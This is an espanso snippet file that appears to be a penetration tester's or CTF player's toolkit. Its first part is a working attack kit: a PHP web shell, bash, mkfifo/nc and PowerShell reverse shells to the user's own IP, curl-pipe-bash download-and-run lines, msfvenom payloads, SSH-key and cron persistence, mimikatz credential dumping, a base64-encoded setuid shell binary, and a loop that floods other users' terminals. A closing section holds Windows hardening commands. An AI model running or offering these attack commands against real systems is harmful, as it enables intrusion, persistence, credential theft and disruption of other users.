# espanso match file

# For a complete introduction, visit the official docs at: https://espanso.org/docs/

# You can use this file to define the base matches (aka snippets)
# that will be available in every application when using espanso.
global_vars:
  - name: "IP"
    type: "shell"
    params:
      cmd: 'ip a show tun0 | grep -oP ''inet \K[\d.]+'' || hostname -I | awk ''{print $1}'''
      
  - name: "ssh_key"
    type: "shell"
    params:
      cmd: "cat /home/kali/.ssh/id_rsa.pub"

matches:
# QOL
  - trigger: ":ip"
    replace: "{{IP}}"
                  
# SETUP AND NMAP              
  - trigger: ":setup"                  
    replace : |
      mkdir -p server && cd server
      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > wshell.php

      mkdir -p linux && cd linux       
      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > shell.sh
      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > linrev.php
      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell86.elf &
      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell64.elf &
      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &


      mkdir -p ../windows & cd ../windows
      
      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=445 -f exe -o shell86.exe &
      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=445 -f exe -o shell64.exe &
      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/winPEAS.bat -O wp.bat &

      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
      
      cd .. && sudo python3 -m http.server 80

  - trigger: ":msfwin"
    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
  - trigger: ":venv"
    replace: "python3 -m venv venv && source venv/bin/activate"

  - trigger: ":msfmwin"
    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=

  - trigger: ":msflin"
    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST=

  - trigger: ":msfmlin"
    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST=

  - trigger: ":smbserver"
    replace: "impacket-smbserver -smb2support share ."

  - trigger: ":pyserver"
    replace: "python3 -m http.server "
  
  - trigger: ":phpserver"
    replace: "php -S 0.0.0.0:"
                                                                                
  - trigger: ":responder"
    replace: "sudo responder -I tun0"
    
  - trigger: ":nc"
    replace: nc -nvlp 22

# ENUMERATION
  - trigger: ":nmap"
    replace: sudo nmap -T4 -A -v -o nmap --min-rate 1000 

  - trigger: ":lping"
    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

  - trigger: ":wping"
    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

  - trigger: ":dirsearch"
    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "

  - trigger: ":netscan"
    replace: |
      sudo nmap -T4 -A -v -o nmap --min-rate 1000 $IP 
      sudo nmap -T4 --script=vuln -v -o vuln --min-rate 1000 $IP
      sudo nmap -T4 -A -v -p- -o alltcp --min-rate 1000 $IP
      sudo nmap -A -v -p- -o alltcpslow $IP
      echo "-----------------------------------------------------"
      echo "TCP is done, startng udp (slowwwwww)"
      echo "-----------------------------------------------------"
      sudo nmap -T4 -sU -A -vv -p- -o udp --min-rate 1000 $IP


# AWS Stuff

  - trigger: ":seshauth"
    replace: |
      aws configure set aws_session_token "<session token>"

  - trigger: ":unset"
    replace: |
      unset AWS_ACCESS_KEY_ID
      unset AWS_SECRET_ACCESS_KEY
      unset AWS_SESSION_TOKEN



# REVERSE SHELLS                                                                
  # LINUX
  - trigger: ":rbash"
    replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"

  - trigger: ":rphp"
    replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
  - trigger: ":wphp"
    replace: <?php system($_GET['c']);?>
    
  - trigger: ":rcurl"                                                           
    replace: curl http://{{IP}}/shell.sh | bash
                                                                                
  - trigger: ":rwget"                                                           
    replace: wget http://192.168.174.150/linux/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh

  - trigger: ":mkfifo"                                                          
    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
    
  # WINDOWS
  - trigger: ":rpowershell"
    replace: |
      $LHOST = "{{IP}}"; $LPORT = 22; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 

  - trigger: ":secstring"                                                          
    replace: "$SecPassword = ConvertTo-SecureString 'PASS' -AsPlainText -Force"

  - trigger: ":seccred"                                                          
    replace: $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $SecPassword)

# POST
  - trigger: ":pty"
    replace: |
      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
      export TERM=screen
      stty rows 60
      stty columns 150

  - trigger: ":tty"
    replace: |
      reset
      stty raw -echo; fg
      stty rows 60 
      stty columns 150
      export TERM=screen
    
  - trigger: ":sshpersist"
    replace: |
      mkdir -p ~/.ssh
      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
      
  - trigger: ":cronpersist"
    replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -

  - trigger: ":wget"
    replace: wget http://{{IP}}/
    
  - trigger: ":certutil"
    replace: certutil.exe -urlcache -split -f http://{{IP}}/windows/
  
  - trigger: ":pligolo"
    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443

  - trigger: ":aligolo"
    replace: ./agent -connect {{IP}}:443 -ignore-cert

  - trigger: ":rligolo"
    replace: sudo ip route add 192.168.110.0/24 dev ligolo
  - trigger: ":mimi"
    replace:   
           | 
      "privilege::debug" "sekurlsa::logonpasswords" exit

# EXPLOITS

  - trigger: ":suid"
    replace: find / -perm -u=s -type f 2>/dev/null
    
  - trigger: ":fileprivesc"
    replace: echo "f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAAIAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F" | base64 -d >> /tmp/tmp && sudo chown root:root /tmp/tmp && sudo chmod +sx /tmp/tmp

  - trigger: ":ptspam"
    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done

# WINDOWS HARDENING

  - trigger: ":pshell"
    replace: $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/PowerShell/PowerShell/releases/download/v7.4.1/PowerShell-7.4.1-win-x64.msi' -OutFile 'PowerShellInstaller.msi'; Start-Process -Wait -FilePath 'msiexec.exe' -ArgumentList '/i', 'PowerShellInstaller.msi'

  - trigger: ":defend"
    replace: Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableBehaviorMonitoring $false; Set-MpPreference -DisableBlockAtFirstSeen $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisablePrivacyMode $false; Set-MpPreference -SignatureUpdateInterval 0; if (-not (Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet')) { New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Force }; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Name 'SpynetReporting' -Value 2

  - trigger: ":avira"
    replace: New-Item -ItemType Directory -Path 'C:\Temp\' -Force; Invoke-WebRequest -Uri 'https://package.avira.com/download/spotlight-windows-bootstrapper/avira_en_sptl1_9dca5a3d7d8f4fdf__pavwws-spotlight-release.exe' -OutFile 'C:\Temp\startup.exe' ; Start-Process -FilePath 'C:\Temp\startup.exe' -Wait

  - trigger: ":sysint"
    replace: New-Item -ItemType Directory -Path 'C:\tools\' -Force ; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/SysinternalsSuite.zip' -OutFile 'C:\tools\SysinternalsSuite.zip' ; Expand-Archive -Path 'C:\tools\SysinternalsSuite.zip' -DestinationPath 'C:\tools\SysinternalsSuite' -Force ; Remove-Item 'C:\tools\SysinternalsSuite.zip' ; Start-Process -FilePath 'C:\tools\SysinternalsSuite\procexp64.exe' ; Start-Process -FilePath 'C:\tools\SysinternalsSuite\tcpview64.exe'

  - trigger: ":scripts"
    replace: $url = "https://github.com/gerbsec/cyberherd-scripts/archive/refs/heads/main.zip"; $zipPath = "C:\cyberherd-scripts-main.zip"; $extractPath = "C:\tools"; if (-not (Test-Path $extractPath)) { New-Item -Path $extractPath -ItemType Directory }; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri $url -OutFile $zipPath; Expand-Archive -Path $zipPath -DestinationPath $extractPath; Remove-Item -Path $zipPath; Set-Location -Path "$extractPath\cyberherd-scripts-main\herdening\windows"

  - trigger: ":firewall"
    replace: Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
  
  - trigger: ":firewallall"
    replace: New-NetFirewallRule -DisplayName "Deny All Except SSH and RDP" -Direction Inbound -LocalPort 1-21,23,24-65535 -Action Block -Profile Any -Protocol TCP; New-NetFirewallRule -DisplayName "Allow SSH and RDP" -Direction Inbound -LocalPort 22,3389 -Action Allow -Profile Any -Protocol TCP

  - trigger: ":localadmin"
    replace: Get-LocalGroupMember -Group "Administrators" | Select-Object Name

  - trigger: ":chuserpass"
    replace: needs to be fixed

  - trigger: ":chuserpass"
    replace: Get-LocalUser | Select-Object Name

  - trigger: ":localuser"
    replace: Get-LocalUser | Select-Object Name
  
  - trigger: ":notepad"
    replace: Invoke-WebRequest -Uri 'https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.6.2/npp.8.6.2.Installer.x64.exe' -OutFile "$env:TEMP\npp_installer.exe" -UseBasicParsing; Start-Process -FilePath "$env:TEMP\npp_installer.exe" -Wait


  - trigger: ":sysmon"
    replace: Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml' -OutFile 'C:\tools\SysinternalsSuite\sysmonconfig-export.xml' ; Start-Process -FilePath 'C:\tools\SysinternalsSuite\sysmon.exe' -ArgumentList '/accepteula /i C:\tools\SysinternalsSuite\sysmonconfig-export.xml' -Wait

  - trigger: ":cmdlog"
    replace: New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell' -Name ScriptBlockLogging -Force; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1

  - trigger: ":DCfirewall"
    replace: |
      New-NetFirewallRule -DisplayName "Allow DNS" -Direction Inbound -Protocol TCP -LocalPort 53
      New-NetFirewallRule -DisplayName "Allow DNS UDP" -Direction Inbound -Protocol UDP -LocalPort 53
      New-NetFirewallRule -DisplayName "Allow Kerberos" -Direction Inbound -Protocol TCP -LocalPort 88
      New-NetFirewallRule -DisplayName "Allow Kerberos UDP" -Direction Inbound -Protocol UDP -LocalPort 88
      New-NetFirewallRule -DisplayName "Allow W32Time" -Direction Inbound -Protocol UDP -LocalPort 123
      New-NetFirewallRule -DisplayName "Allow RPC Endpoint Mapper" -Direction Inbound -Protocol TCP -LocalPort 135
      New-NetFirewallRule -DisplayName "Allow NetBIOS" -Direction Inbound -Protocol UDP -LocalPort 137,138
      New-NetFirewallRule -DisplayName "Allow NetBIOS" -Direction Inbound -Protocol TCP -LocalPort 139
      New-NetFirewallRule -DisplayName "Allow LDAP" -Direction Inbound -Protocol TCP -LocalPort 389
      New-NetFirewallRule -DisplayName "Allow LDAP UDP" -Direction Inbound -Protocol UDP -LocalPort 389
      New-NetFirewallRule -DisplayName "Allow SMB" -Direction Inbound -Protocol TCP -LocalPort 445
      New-NetFirewallRule -DisplayName "Allow Kerberos password change" -Direction Inbound -Protocol TCP -LocalPort 464
      New-NetFirewallRule -DisplayName "Allow Kerberos password change UDP" -Direction Inbound -Protocol UDP -LocalPort 464
      New-NetFirewallRule -DisplayName "Allow LDAP SSL" -Direction Inbound -Protocol TCP -LocalPort 636
      New-NetFirewallRule -DisplayName "Allow LDAP Global Catalog" -Direction Inbound -Protocol TCP -LocalPort 3268
      New-NetFirewallRule -DisplayName "Allow LDAP GC SSL" -Direction Inbound -Protocol TCP -LocalPort 3269
      New-NetFirewallRule -DisplayName "Allow RPC Ephemeral Ports" -Direction Inbound -Protocol TCP -LocalPort 49152-65535
      New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Protocol TCP -LocalPort 22
      New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389

      Get-NetFirewallRule | Where-Object {$_.DisplayName -notlike "Allow DNS" -and $_.DisplayName -notlike "Allow DNS UDP" -and $_.DisplayName -notlike "Allow Kerberos" -and $_.DisplayName -notlike "Allow Kerberos UDP" -and $_.DisplayName -notlike "Allow W32Time" -and $_.DisplayName -notlike "Allow RPC Endpoint Mapper" -and $_.DisplayName -notlike "Allow NetBIOS" -and $_.DisplayName -notlike "Allow NetBIOS" -and $_.DisplayName -notlike "Allow LDAP" -and $_.DisplayName -notlike "Allow LDAP UDP" -and $_.DisplayName -notlike "Allow SMB" -and $_.DisplayName -notlike "Allow Kerberos password change" -and $_.DisplayName -notlike "Allow Kerberos password change UDP" -and $_.DisplayName -notlike "Allow LDAP SSL" -and $_.DisplayName -notlike "Allow LDAP Global Catalog" -and $_.DisplayName -notlike "Allow LDAP GC SSL" -and $_.DisplayName -notlike "Allow RPC Ephemeral Ports" -and $_.DisplayName -notlike "Allow SSH" -and $_.DisplayName -notlike "Allow RDP"} | Remove-NetFirewallRule

  - trigger: ":pcastle"
    replace: Invoke-WebRequest -Uri 'https://github.com/vletoux/pingcastle/releases/download/3.0.0.4/PingCastle_3.0.0.4.zip' -OutFile 'PingCastle_3.0.0.4.zip'; Expand-Archive -Path 'PingCastle_3.0.0.4.zip' -DestinationPath 'pingcastle'; Remove-Item 'PingCastle_3.0.0.4.zip'

  - trigger: ":auditservice"
    replace: Get-Service | Where-Object { $_.Status -eq 'Running' -and $_.DisplayName -match 'Network' } | Select-Object DisplayName, Status

  - trigger: ":killsmbv1"
    replace: Set-SmbServerConfiguration -EnableSMB1Protocol $false

  - trigger: ":smbsigning"
    replace: Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1

  - trigger: ":smbexec"
    replace: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLinkedConnections" -Value 0

  - trigger: ":killrc4"
    replace: $encryptionType = 0x18; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -Value $encryptionType; gpupdate /force

  - trigger: ":killipv6"
    replace: Get-NetAdapter | ForEach-Object { Disable-NetAdapterBinding -InterfaceAlias $_.Name -ComponentID ms_tcpip6 -Confirm:$false }; Write-Host "IPv6 has been disabled on all network interfaces."

  - trigger: ":llmnr"
    replace: New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Force; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

  - trigger: ":killwinrm"
    replace: Disable-PSRemoting -Force

  - trigger: ":ntlmv2"
    replace: Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

  - trigger: ":auditsys"
    replace: Get-ChildItem -Path "$env:SYSTEMROOT\SYSVOL\sysvol" -Recurse -Filter "*.[xml|xml]" | ForEach-Object { Select-String -Path $_.FullName -Pattern "<Name>.*cpassword.*<\/Name>" -Context 0, 2 }

  - trigger: ":sysvolfix"
    replace: (Get-ChildItem -Path "$env:SYSTEMROOT\SYSVOL\sysvol" -Recurse -Filter "*.[xml|xml]").FullName | ForEach-Object { Set-Content -Path $_ -Value ((Get-Content $_ -Raw) -replace '<Name>.*cpassword.*<\/Name>', '<Name></Name>') -Force }


  - trigger: ":printspooler"
    replace: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\PrintSpooler" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\PrintSpooler" -Name "Start" -Value 4; Stop-Service -Name Spooler -Force; Start-Service -Name Spooler

  - trigger: ":eternalblue"
    replace: (Get-HotFix -Description "Security Update" | Where-Object {$_.HotFixID -like "KB401*"}).Count -gt 0

    
